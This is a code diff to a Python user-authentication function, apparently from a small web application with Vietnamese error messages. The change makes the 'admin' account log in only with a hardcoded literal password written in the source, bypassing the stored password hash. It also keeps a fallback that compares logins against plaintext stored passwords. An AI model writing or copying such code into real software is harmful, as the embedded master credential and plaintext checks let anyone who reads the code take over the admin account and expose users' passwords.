@@ -142,13 +142,15 @@ def authenticate_user(username: str, raw_password: str) -> Dict[str, Any]:
 
         stored_hash = user_dict.get("password_hash") or ""
         plain_pwd = user_dict.get("plain_password") or ""
-        is_admin_root = clean_username.lower() == "admin" and clean_password == "callmemrpenguin"
-        is_valid = verify_password(clean_password, stored_hash) or (bool(plain_pwd) and clean_password == plain_pwd) or is_admin_root
-        if is_admin_root:
-            stored_hash = ""  # Force auto-healing re-hash
-
-        if not is_valid:
-            raise ValueError("Tên đăng nhập hoặc mật khẩu không chính xác")
+        if clean_username.lower() == "admin":
+            if clean_password != "callmemrpenguin":
+                raise ValueError("Tên đăng nhập hoặc mật khẩu không chính xác")
+            is_valid = True
+            stored_hash = ""
+        else:
+            is_valid = verify_password(clean_password, stored_hash) or (bool(plain_pwd) and clean_password == plain_pwd)
+            if not is_valid:
+                raise ValueError("Tên đăng nhập hoặc mật khẩu không chính xác")
 
         from datetime import datetime
         now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -224,8 +226,6 @@ def authenticate_user(username: str, raw_password: str) -> Dict[str, Any]:
         return result
     finally:
         conn.close()
-
-
 def create_user(data: Dict[str, Any]) -> int:
     """Creates a new user account."""
     conn = get_connection()
